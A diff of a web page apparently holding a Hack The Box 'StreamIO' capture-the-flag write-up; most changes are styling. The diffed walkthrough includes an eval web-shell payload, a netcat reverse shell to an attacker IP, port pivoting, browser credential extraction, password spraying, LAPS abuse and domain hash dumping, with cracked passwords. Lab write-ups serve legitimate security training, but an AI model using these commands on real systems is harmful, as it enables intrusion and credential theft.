-<pre class="language-php"><code v-pre class="language-php">...[SNIP]...
+<pre translate="no" class="language-php"><code v-pre class="language-php">...[SNIP]...
 
 $connection = array(&quot;Database&quot;=&gt;&quot;STREAMIO&quot;, &quot;UID&quot; =&gt; &quot;db_admin&quot;, &quot;PWD&quot; =&gt; 'B1@hx31234567890');
 $handle = sqlsrv_connect('(local)',$connection);
@@ -440,7 +440,7 @@ $handle = sqlsrv_connect('(local)',$connection);
 </doc-codeblock></div>
 <p>So we have the database username and password, but how to use it? After getting stuck here for a while I decided to fuzz the file name in the LFI to see if I can get more source code:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ wfuzz --hh 1712 -b PHPSESSID=luoqop4jub9vubjbl5ngnblrb1 -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt 'https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=FUZZ.php'
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ wfuzz --hh 1712 -b PHPSESSID=luoqop4jub9vubjbl5ngnblrb1 -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt 'https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=FUZZ.php'
 
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -460,7 +460,7 @@ ID           Response   Lines    Word       Chars       Payload
 <p>Cool, we have a <code v-pre>master.php</code> file as well! Doing a bit of code analyses in this file we finally see the path to get a shell.
 The file <code v-pre>master.php</code> is using the function <code v-pre>eval</code> like this:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-php"><code v-pre class="language-php">...[SNIP]...
+<pre translate="no" class="language-php"><code v-pre class="language-php">...[SNIP]...
 
 &lt;?php
 if(isset($_POST['include']))
@@ -481,13 +481,13 @@ echo(&quot; ---- ERROR ---- &quot;);
 </doc-anchor-target>
 <p>We can base64 encode our code to be passed to <code v-pre>eval</code> like this:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ echo 'system($_REQUEST[&quot;cmd&quot;]);' | base64
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ echo 'system($_REQUEST[&quot;cmd&quot;]);' | base64
 c3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOwo=</code></pre>
 </doc-codeblock></div>
 <p>The above will include a new parameter that we can use to run system commands in the <code v-pre>master.php</code> file.</p>
 <p>And then we can send system commands like this:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ curl -s -k -X 'POST' -H 'Content-Type: application/x-www-form-urlencoded' -b 'PHPSESSID=luoqop4jub9vubjbl5ngnblrb1' --data-binary &quot;include=data://text/plain;base64,c3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOwo=&quot; 'https://streamio.htb/admin/?debug=master.php&amp;cmd=dir' | grep '&lt;input name=&quot;include&quot; hidden&gt;' -A 9999 |grep '&lt;/div&gt;' -B 9999 | tail -n +3 | head -n -1
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ curl -s -k -X 'POST' -H 'Content-Type: application/x-www-form-urlencoded' -b 'PHPSESSID=luoqop4jub9vubjbl5ngnblrb1' --data-binary &quot;include=data://text/plain;base64,c3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOwo=&quot; 'https://streamio.htb/admin/?debug=master.php&amp;cmd=dir' | grep '&lt;input name=&quot;include&quot; hidden&gt;' -A 9999 |grep '&lt;/div&gt;' -B 9999 | tail -n +3 | head -n -1
 
 Volume in drive C has no label.
  Volume Serial Number is A381-2B63
@@ -512,7 +512,7 @@ Volume in drive C has no label.
 <p>If the upload fails, the directory <code v-pre>C:\Windows\System32\spool\drivers\color\nc.exe</code> is always a good one to upload files as it is often whitelisted by the AV.</p>
 <p>Using the same Curl command as above we can change the <code v-pre>cmd=</code> value to:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># Upload netcat
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># Upload netcat
 cmd=powershell.exe+iwr+-uri+10.10.14.30/nc.exe+-outfile+&quot;C:/inetpub/streamio.htb/admin/nc.exe&quot;
 
 # Get a reverse shell
@@ -520,7 +520,7 @@ cmd=C:/inetpub/streamio.htb/admin/nc.exe+-e+powershell+10.10.14.30+9001</code></
 </doc-codeblock></div>
 <p>Receiving the reverse shell:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ rlwrap nc -lnvp 9001
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ rlwrap nc -lnvp 9001
 listening on [any] 9001 ...
 connect to [10.10.14.30] from (UNKNOWN) [10.129.186.175] 49935
 Windows PowerShell 
@@ -543,7 +543,7 @@ streamio\yoshihide</code></pre>
 </doc-anchor-target>
 <p>Enumerating users:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\inetpub\streamio.htb\admin&gt; net user
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\inetpub\streamio.htb\admin&gt; net user
 net user
 
 User accounts for \\DC
@@ -556,7 +556,7 @@ The command completed successfully.</code></pre>
 </doc-codeblock></div>
 <p>We can see that <code v-pre>Martin</code> is member of Administrator group:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\inetpub\streamio.htb\admin&gt; net user Martin /domain
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\inetpub\streamio.htb\admin&gt; net user Martin /domain
 net user Martin /domain
 User name                    Martin
 Full Name                    
@@ -586,7 +586,7 @@ Global Group memberships     *Domain Users</code></pre>
 <p>We might need to find a way to escalate from <code v-pre>yoshihide</code> to <code v-pre>Martin</code> or <code v-pre>Administrator</code>.</p>
 <p>Enumerating the network - Ports listening:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\inetpub\streamio.htb\admin&gt; netstat -ano | findstr LISTENING                                                                                                                         
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\inetpub\streamio.htb\admin&gt; netstat -ano | findstr LISTENING                                                                                                                         
 
   TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4                                                                                 
   TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       616
@@ -623,7 +623,7 @@ Global Group memberships     *Domain Users</code></pre>
 </doc-anchor-target>
 <p>Download chisel for linux and windows:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># Chisel for linux
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># Chisel for linux
 $ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
 
 # Chisel for windows
@@ -631,21 +631,21 @@ $ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_
 </doc-codeblock></div>
 <p>Start chisel server in our machine:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ ./chisel server -p 8000 --reverse</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ ./chisel server -p 8000 --reverse</code></pre>
 </doc-codeblock></div>
 <p>Upload chisel for windows to the target and forward port 1433:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\inetpub\streamio.htb\admin&gt; wget 10.10.14.30/chisel.exe -o chisel.exe
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\inetpub\streamio.htb\admin&gt; wget 10.10.14.30/chisel.exe -o chisel.exe
 
 PS C:\inetpub\streamio.htb\admin&gt; .\chisel.exe client 10.10.14.30:8000 R:1433:127.0.0.1:1433</code></pre>
 </doc-codeblock></div>
 <p>Now we can connect to MSSQL using the credentials we found earlier:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sqsh -S 127.0.0.1 -U db_admin -P 'B1@hx31234567890'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sqsh -S 127.0.0.1 -U db_admin -P 'B1@hx31234567890'</code></pre>
 </doc-codeblock></div>
 <p>Enumerating the databases:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">1&gt; SELECT name, database_id, create_date                                                                                                                 
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">1&gt; SELECT name, database_id, create_date                                                                                                                 
 FROM sys.databases
 2&gt; go
 
@@ -658,7 +658,7 @@ streamio_backup</code></pre>
 </doc-codeblock></div>
 <p>Lets dum the users table of streamio_backup database:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">1&gt; use streamio_backup                                                                                                                                   
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">1&gt; use streamio_backup                                                                                                                                   
 2&gt; go                                                                                                                                                    
 1&gt; select * from users                                                                                                                                   
 2&gt; go
@@ -674,7 +674,7 @@ streamio_backup</code></pre>
 </doc-codeblock></div>
 <p>The important credentials found here is <code v-pre>nikk37</code> user as it is also a user in the machine. Using Crackstation we can crack the password:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">Username: nikk37
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">Username: nikk37
 Password: get_dem_girls2@yahoo.com</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="shell-as-nikk37">
@@ -685,19 +685,19 @@ Password: get_dem_girls2@yahoo.com</code></pre>
 </doc-anchor-target>
 <p>Using <code v-pre>nikk37</code> credentials we can connect to the target via WinRM:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ evil-winrm -u nikk37 -p 'get_dem_girls2@yahoo.com' -i 10.129.186.175
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ evil-winrm -u nikk37 -p 'get_dem_girls2@yahoo.com' -i 10.129.186.175
 
 PS C:\Users\nikk37\Documents&gt; whoami
 streamio\nikk37</code></pre>
 </doc-codeblock></div>
 <p>Get the user flag:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37\desktop&gt; type user.txt
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37\desktop&gt; type user.txt
 053a212058dd2bd731b25d4a8fc6d4e6</code></pre>
 </doc-codeblock></div>
 <p>Enumerating <code v-pre>nikk37</code> files we find a Firefox database file <code v-pre>key4.db</code> and 2 interesintg json files, <code v-pre>logins.json</code> and <code v-pre>logins-backup.json</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release&gt; dir
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release&gt; dir
 
 Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release
 
@@ -745,17 +745,17 @@ d-----        2/22/2022   2:40 AM                storage
 </doc-codeblock></div>
 <p>We use Evil-WinRM to download to our machine and then try to crack it:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell"># We need to use the full path!
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell"># We need to use the full path!
 PS C:\Users\nikk37&gt; download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db key4.db</code></pre>
 </doc-codeblock></div>
 <p>Download <code v-pre>logins.json</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell"># We need to use the full path!
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell"># We need to use the full path!
 PS C:\Users\nikk37&gt; download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json logins.json</code></pre>
 </doc-codeblock></div>
 <p>We can use <a href="https://github.com/lclevy/firepwd">Firepwd</a> tool to crack the DB:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># We use -d to specify the directory where key4.db and logins.json are saved
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># We use -d to specify the directory where key4.db and logins.json are saved
 $ python firepwd.py -d ../www/
 ...[SNIP]...
 decrypting login/password pairs
@@ -772,12 +772,12 @@ https://slack.streamio.htb:b'JDgodd',b'password@12'</code></pre>
 </doc-anchor-target>
 <p>Now that we have many users and passwords we can use crackmapexec to do a password spray. I got all the users we found so far in a file called <code v-pre>users.txt</code> and the same for passwords and put it in <code v-pre>password.txt</code>:
 <figure class="content-center">
-    <img src="images/image05.png" alt="">
+    <img src="images/image05.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ cme smb streamio.htb -u users.txt -p passwords.txt --continue-on-success
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ cme smb streamio.htb -u users.txt -p passwords.txt --continue-on-success
 ...[SNIP]...
 SMB streamIO.htb 445 DC [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com 
 ...[SNIP]...
@@ -787,7 +787,7 @@ SMB streamIO.htb 445 DC [+] streamIO.htb\jdgodd:JDg0dd1s@d0p3cr3@t0r
 <p>Very important to use <code v-pre>--continue-on-success</code> flag, otherwise crackmapexec will stop when he finds a valid login.</p>
 <p>Cool! We got one more credentials, for <code v-pre>jdgodd</code> user:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">Username: jdgodd
+<pre translate="no" class="language-none"><code v-pre class="language-none">Username: jdgodd
 Password: JDg0dd1s@d0p3cr3@t0r</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="bloodhound">
@@ -799,7 +799,7 @@ Password: JDg0dd1s@d0p3cr3@t0r</code></pre>
 <p>We still don&#x27;t know the path to <code v-pre>martin</code> or <code v-pre>administrator</code>. Lets run Bloodhound to map the AD for us and show some graphs!
 Run <a href="https://github.com/BloodHoundAD/SharpHound">SharpHound</a> in the target to extract the data:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">*Evil-WinRM* PS C:\Users\nikk37&gt; .\SharpHound.exe -c all
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">*Evil-WinRM* PS C:\Users\nikk37&gt; .\SharpHound.exe -c all
 
 2022-06-06T03:46:48.9960341-07:00|INFORMATION|Status: 97 objects finished (+97 2.204545)/s -- Using 40 MB RAM
 2022-06-06T03:46:48.9960341-07:00|INFORMATION|Enumeration finished in 00:00:44.2927695
@@ -807,26 +807,26 @@ Run <a href="https://github.com/BloodHoundAD/SharpHound">SharpHound</a> in the t
 </doc-codeblock></div>
 <p>Download the loot to our machine:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">*Evil-WinRM* PS C:\Users\nikk37&gt; download C:\Users\nikk37\20220606034648_BloodHound.zip bloodhound-loot.zip</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">*Evil-WinRM* PS C:\Users\nikk37&gt; download C:\Users\nikk37\20220606034648_BloodHound.zip bloodhound-loot.zip</code></pre>
 </doc-codeblock></div>
 <p>Start neo4j server:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sudo neo4j console</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sudo neo4j console</code></pre>
 </doc-codeblock></div>
 <p>Start Bloodhound, login to neo4j and import the loot (simply drag-and-drop the .zip)!</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">$ ./BloodHound</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">$ ./BloodHound</code></pre>
 </doc-codeblock></div>
 <p>Mark the user we owned:
 <figure class="content-center">
-    <img src="images/image06.png" alt="">
+    <img src="images/image06.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 I also marked <code v-pre>martin</code> as a High Value.
 From the Bloodhound output there is no direct path from <code v-pre>nikk37</code> to admins accounts.</p>
 <p>We have <code v-pre>jdgodd</code> password, so lets mark him as owned too. As we select the  &quot;Shortest Path to Owned Principals&quot; we finally see tha path to Administrator:
 <figure class="content-center">
-    <img src="images/image07.png" alt="">
+    <img src="images/image07.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -841,13 +841,13 @@ What is LAPS?
 </doc-anchor-target>
 <p>First lets upload <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">PowerView</a>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37&gt; upload PowerView.ps1
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37&gt; upload PowerView.ps1
 PS C:\Users\nikk37&gt; Import-Module ./PowerView.ps1</code></pre>
 </doc-codeblock></div>
 <p><em>Disclaimer: For some reason only the PowerView.ps1 script from the dev branch work.</em></p>
 <p>Now we create the creds to use and set a Domain Object Owner to jdgodd:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37&gt; $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37&gt; $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
 
 PS C:\Users\nikk37&gt; $Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\jdgodd', $SecPassword)
 
@@ -855,13 +855,13 @@ PS C:\Users\nikk37&gt; Set-DomainObjectOwner -Credential $Cred -Identity &quot;C
 </doc-codeblock></div>
 <p>Give jdgodd all the rights and add him as a member off CORE STAFF:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity &quot;CORE STAFF&quot; -PrincipalIdentity jdgodd -Rights All
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity &quot;CORE STAFF&quot; -PrincipalIdentity jdgodd -Rights All
 
 PS C:\Users\nikk37&gt; Add-DomainGroupMember -Identity &quot;CORE STAFF&quot; -Members &quot;jdgodd&quot; -Credential $Cred -Verbose</code></pre>
 </doc-codeblock></div>
 <p>No errors so far, lets check if it works:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37&gt; Get-DomainGroupMember -Identity 'CORE STAFF'
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37&gt; Get-DomainGroupMember -Identity 'CORE STAFF'
 
 GroupDomain             : streamIO.htb
 GroupName               : CORE STAFF
@@ -874,7 +874,7 @@ MemberSID               : S-1-5-21-1470860369-1569627196-4264678630-1104</code><
 </doc-codeblock></div>
 <p>Great! Lets dump LAPS:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37&gt; Get-DomainObject dc.streamio.htb -Credential $Cred -Properties &quot;ms-mcs-AdmPwd&quot;,name
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\Users\nikk37&gt; Get-DomainObject dc.streamio.htb -Credential $Cred -Properties &quot;ms-mcs-AdmPwd&quot;,name
 
 name ms-mcs-admpwd
 ---- -------------
@@ -882,16 +882,16 @@ DC   !vG(xZ{)5b8!4G</code></pre>
 </doc-codeblock></div>
 <p>Alternatively we can use crackmapexec to dump LAPS:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ crackmapexec ldap 10.129.186.175 -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -M laps</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ crackmapexec ldap 10.129.186.175 -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -M laps</code></pre>
 </doc-codeblock></div>
 <p><figure class="content-center">
-    <img src="images/image08.png" alt="">
+    <img src="images/image08.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Now we can get a shell as Administrator using Evil-Winrm:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ evil-winrm -u Administrator -p '!vG(xZ{)5b8!4G' -i 10.129.186.175
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ evil-winrm -u Administrator -p '!vG(xZ{)5b8!4G' -i 10.129.186.175
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
 streamio\administrator</code></pre>
@@ -905,7 +905,7 @@ streamio\administrator</code></pre>
 </doc-anchor-target>
 <p>Dumping the secrets</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ impacket-secretsdump streamio.htb/Administrator:'!vG(xZ{)5b8!4G'@10.129.186.175
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ impacket-secretsdump streamio.htb/Administrator:'!vG(xZ{)5b8!4G'@10.129.186.175
 
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation                                                                                                 
                                                                                                                                                          
@@ -975,23 +975,23 @@ DC$:des-cbc-md5:e62aa7866b0bc4ec</code></pre>
                                 <!-- Required only on API pages -->
                                 <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                             </div>
-                            <footer class="clear-both">
+                            <footer id="retype-content-footer" class="clear-both">
                             
-                                <nav class="flex mt-14">
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/routerspace/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/routerspace/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
-                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
                                                 <span class="block mt-1">Routerspace</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/talkative/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/talkative/">
                                             <span>
-                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
                                                 <span class="block mt-1">Talkative</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
@@ -1001,24 +1001,24 @@ DC$:des-cbc-md5:e62aa7866b0bc4ec</code></pre>
                             </footer>
                         </main>
                 
-                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
-                            <footer class="flex flex-wrap items-center justify-between">
-                                <div>
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
                                     <ul class="flex flex-wrap items-center text-sm">
                                     </ul>
                                 </div>
-                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. Caue All rights reserved.</p></div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. Caue All rights reserved.</p></div>
                             </footer>
                         </div>
                     </div>
                 
                     <!-- Rendered if sidebar right is enabled -->
                     <!-- Sidebar right skeleton-->
-                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
                         <div class="pl-5">
-                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                         </div>
                     </div>
                 
@@ -1034,7 +1034,7 @@ DC$:des-cbc-md5:e62aa7866b0bc4ec</code></pre>
     </div>
 
 
-    <div id="docs-overlay-target"></div>
+    <div id="retype-overlay-target"></div>
 
     <script data-cfasync="false">window.__DOCS__ = { "title": "StreamIO", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
